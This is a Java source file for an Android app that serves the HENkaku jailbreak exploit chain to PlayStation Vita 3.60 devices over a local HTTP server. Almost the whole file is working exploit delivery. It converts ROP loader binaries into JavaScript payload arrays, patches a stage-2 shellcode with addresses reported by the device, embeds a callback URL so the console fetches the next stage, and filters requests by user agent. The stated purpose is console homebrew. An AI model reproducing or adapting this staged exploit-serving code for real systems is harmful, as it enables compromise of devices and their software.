/**
 * Copyright 2016 codestation. All Rights Reserved.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.codestation.henkakuserver;

import android.content.Context;
import android.text.TextUtils;
import android.util.Log;
import android.util.Pair;

import org.apache.commons.io.IOUtils;
import org.apache.commons.lang3.ArrayUtils;

import java.io.ByteArrayInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import fi.iki.elonen.NanoHTTPD;


public class HenkakuServer extends NanoHTTPD {

    private Context context;

    private String lastIpAddress;
    private String currentIpAddress;
    private byte[] stage1;
    private byte[] stage2;

    public HenkakuServer(Context ctx, int port) {
        super(port);
        context = ctx;
    }

    public synchronized void setIpAddress(String ipAddress) {
        currentIpAddress = ipAddress;
    }

    private synchronized String getIpAddress() {
        return currentIpAddress;
    }

    private Pair<ArrayList<Integer>, List<Byte>> preprocessRop(byte[] urop) throws Exception {

        byte[] loader = new byte[urop.length + ((-urop.length) & 3)];
        System.arraycopy(urop, 0, loader, 0, urop.length);

        ByteBuffer buf = ByteBuffer.wrap(loader).order(ByteOrder.LITTLE_ENDIAN);

        int header_size = 0x40;

        int dsize = buf.getInt(0x10);
        int csize = buf.getInt(0x20);
        int reloc_size = buf.getInt(0x30);
        int symtab_size = buf.getInt(0x38);

        if (csize % 4 != 0) {
            throw new Exception("csize % 4 != 0???");
        }

        int reloc_offset = header_size + dsize + csize;
        int symtab = reloc_offset + reloc_size;
        int symtab_n = symtab_size / 8;

        Map<Integer, String> reloc_map = new HashMap<>();

        for (int x = 0; x < symtab_n; ++x) {
            int sym_id = buf.getInt(symtab + 8 * x);
            int str_offset = buf.getInt(symtab + 8 * x + 4);
            int end = str_offset;

            while (loader[end] != 0) {
                end += 1;
            }

            String name = new String(Arrays.copyOfRange(loader, str_offset, end));
            reloc_map.put(sym_id, name);
        }

        Map<Pair<String, Integer>, Integer> reloc_type_map = new HashMap<>();

        reloc_type_map.put(new Pair<>("rop.data", 0), 1);
        reloc_type_map.put(new Pair<>("SceWebKit", 0), 2);
        reloc_type_map.put(new Pair<>("SceLibKernel", 0), 3);
        reloc_type_map.put(new Pair<>("SceLibc", 0), 4);
        reloc_type_map.put(new Pair<>("SceLibHttp", 0), 5);
        reloc_type_map.put(new Pair<>("SceNet", 0), 6);
        reloc_type_map.put(new Pair<>("SceAppMgr", 0), 7);

        int want_len = 0x40 + dsize + csize;

        ArrayList<Integer> urop_js = new ArrayList<>();
        byte[] relocs = new byte[want_len / 4];

        int reloc_n = reloc_size / 8;
        for (int x = 0; x < reloc_n; ++x) {
            int reloc_type = buf.getShort(reloc_offset + 8 * x);
            int sym_id = buf.getShort(reloc_offset + 8 * x + 2);
            int offset = buf.getInt(reloc_offset + 8 * x + 4);

            if (offset % 4 != 0) {
                throw new Exception("offset % 4 != 0???");
            }

            if (relocs[offset / 4] != 0) {
                throw new Exception("symbol relocated twice, not supported");
            }

            Integer wk_reloc_type = reloc_type_map.get(new Pair<>(reloc_map.get(sym_id), reloc_type));

            if (wk_reloc_type == null) {
                throw new Exception("unsupported relocation type");
            }

            relocs[offset / 4] = wk_reloc_type.byteValue();
        }

        for (int x = 0; x < want_len; x += 4) {
            urop_js.add(buf.getInt(x));
        }

        List<Byte> relocsArray = Arrays.asList(ArrayUtils.toObject(relocs));

        return new Pair<>(urop_js, relocsArray);
    }

    /**
     * Convert the loader code to shellcode embedded in js
     *
     * @param loader loader compiled code
     * @return the shellcode embedded in js
     * @throws Exception
     */
    private String preprocessToJs(byte[] loader) throws Exception {
        Pair<ArrayList<Integer>, List<Byte>> data = preprocessRop(loader);

        List<Long> longList = new ArrayList<>();
        for (Integer i : data.first) {
            longList.add(i & 0xFFFFFFFFL);
        }

        String payload = TextUtils.join(",", longList);
        String relocations = TextUtils.join(",", data.second);

        return String.format("\npayload = [%1$s];\nrelocs = [%2$s];\n", payload, relocations);
    }

    /**
     * Convert the exploit to a shellcode in binary format
     *
     * @param exploit payload compiled code
     * @return the shellcode
     * @throws Exception
     */
    private byte[] preprocessToBin(byte[] exploit) throws Exception {
        Pair<ArrayList<Integer>, List<Byte>> data = preprocessRop(exploit);

        int size = 4 + data.first.size() * 4 + data.second.size();
        byte[] out = new byte[size + ((-size) & 3)];
        ByteBuffer buf = ByteBuffer.wrap(out).order(ByteOrder.LITTLE_ENDIAN);

        buf.putInt(data.second.size());

        for (Integer val : data.first) {
            buf.putInt(val);
        }

        for (Byte val : data.second) {
            buf.put(val);
        }

        return out;
    }

    /**
     * Finalize the exploit with the addesses from the device
     *
     * @param exploit payload compiled code
     * @param params  list of addresses from the device
     * @return patched shellcode
     * @throws Exception
     */
    private byte[] patchExploit(byte[] exploit, Map<String, String> params) throws Exception {

        if (params.size() != 7) {
            throw new Exception("invalid argument count");
        }

        ArrayList<Long> args = new ArrayList<>();
        args.add(0L);

        for (int i = 1; i <= 7; ++i) {
            String arg = String.format("a%s", i);
            if (params.containsKey(arg)) {
                args.add(Long.parseLong(params.get(arg), 16));
            } else {
                throw new Exception(String.format("argument %s is missing", arg));
            }
        }

        byte[] copy = new byte[exploit.length];
        System.arraycopy(exploit, 0, copy, 0, exploit.length);

        ByteBuffer buf = ByteBuffer.wrap(copy).order(ByteOrder.LITTLE_ENDIAN);
        int size_words = buf.getInt(0);

        int dsize = buf.getInt(4 + 0x10);
        int csize = buf.getInt(4 + 0x20);

        long data_base = args.get(1) + csize;

        for (int i = 1; i < size_words; ++i) {
            long add = 0;
            byte x = buf.get(size_words * 4 + 4 + i - 1);

            if (x == 1) {
                add = data_base;
            } else if (x != 0) {
                add = args.get(x);
            }

            buf.putInt(i * 4, buf.getInt(i * 4) + (int) add);
        }

        byte[] out = new byte[dsize + csize];

        System.arraycopy(copy, 4 + 0x40, out, csize, dsize);
        System.arraycopy(copy, 4 + 0x40 + dsize, out, 0, csize);

        return out;
    }

    /**
     * Write the url to fetch the next stage into the shellcode
     *
     * @param stage code of the current stage
     * @param url   address to fetch the next stage
     * @return modified shellcode
     * @throws UnsupportedEncodingException
     */
    private byte[] writePkgUrl(byte[] stage, String url) throws UnsupportedEncodingException {

        // prepare search pattern
        byte[] pattern = new byte[256];
        Arrays.fill(pattern, (byte) 0x78);

        List a = Arrays.asList(ArrayUtils.toObject(stage));
        List b = Arrays.asList(ArrayUtils.toObject(pattern));

        // find url placeholder in loader
        int idx = Collections.indexOfSubList(a, b);

        // convert the url to a byte array
        byte[] urlArray = url.getBytes("UTF-8");

        // write the url in the loader
        System.arraycopy(urlArray, 0, stage, idx, urlArray.length);
        Arrays.fill(stage, idx + urlArray.length, idx + 256, (byte) 0x0);

        return stage;
    }

    /**
     * Get the javascript loader payoad
     *
     * @return shellcode (js format)
     * @throws Exception
     */
    private String getLoaderJs() throws Exception {

        // reuse the modified loader if the ip address hasn't changed
        if (stage1 == null || lastIpAddress == null || !lastIpAddress.equals(getIpAddress())) {
            InputStream is = context.getAssets().open("loader.rop.bin");
            byte[] loader = IOUtils.toByteArray(is);
            String url = "http://" + getIpAddress() + ":" + getListeningPort() + "/stage2";
            stage1 = writePkgUrl(loader, url);
            lastIpAddress = getIpAddress();
        }

        return preprocessToJs(stage1);
    }

    /**
     * Get the binary exploit payload
     *
     * @param params list of addresses from the device
     * @return shellcode (binary format)
     * @throws Exception
     */
    private InputStream getExploitBin(Map<String, String> params) throws Exception {

        // reuse the preprocessed exploit if the ip address hasn't changed
        if (stage2 == null || lastIpAddress == null || !lastIpAddress.equals(getIpAddress())) {
            InputStream is = context.getAssets().open("exploit.rop.bin");
            byte[] exploit = IOUtils.toByteArray(is);
            stage2 = preprocessToBin(exploit);
            String url = "http://" + getIpAddress() + ":" + getListeningPort() + "/pkg";
            stage2 = writePkgUrl(stage2, url);
            lastIpAddress = getIpAddress();
        }

        byte[] patched = patchExploit(stage2, params);
        return new ByteArrayInputStream(patched);
    }

    private InputStream getPackageFile(String uri) throws IOException {
        try {
            return context.getAssets().open(uri.substring(1));
        } catch (FileNotFoundException e) {
            return null;
        }
    }

    @Override
    public Response serve(IHTTPSession session) {
        Response response;

        String uri = session.getUri();
        Log.d("henkaku", String.format("Request URI: %s", uri));

        String agent = session.getHeaders().get("user-agent");
        if (agent != null && !agent.contains("PlayStation Vita 3.60") && (uri.equals("/") || uri.equals("stage1"))) {
            Log.d("henkaku", "Request from non PS Vita");
            return newFixedLengthResponse(String.format("<html><body><h2>%s</h2></body></html>", context.getString(R.string.agent_message)));
        }

        try {
            switch (uri) {
                case "/":
                    InputStream isi = context.getAssets().open("index.html");
                    String ipage = IOUtils.toString(isi, "UTF-8");
                    response = newFixedLengthResponse(ipage);
                    break;
                case "/stage1":
                    InputStream isw = context.getAssets().open("exploit.html");
                    String page = IOUtils.toString(isw, "UTF-8");
                    response = newFixedLengthResponse(page);
                    break;
                case "/payload.js":
                    String payload = getLoaderJs();
                    response = newFixedLengthResponse(Response.Status.OK, "application/javascript", payload);
                    break;
                case "/stage2":
                    InputStream isb = getExploitBin(session.getParms());
                    response = newChunkedResponse(Response.Status.OK, "octet/stream", isb);
                    break;
                default:
                    if (uri.startsWith("/pkg/")) {
                        InputStream isf = getPackageFile(uri);

                        if (isf != null) {
                            response = newChunkedResponse(Response.Status.OK, "octet/stream", isf);
                        } else {
                            response = newFixedLengthResponse(Response.Status.NOT_FOUND, "text/plain", "Not found");
                        }
                    } else {
                        response = newFixedLengthResponse(Response.Status.NOT_FOUND, "text/plain", "Not found");
                    }
                    break;
            }
        } catch (Exception e) {
            e.printStackTrace();
            response = newFixedLengthResponse("<html><body><h3>Internal server error</h3></body></html>");
        }

        return response;

    }
}
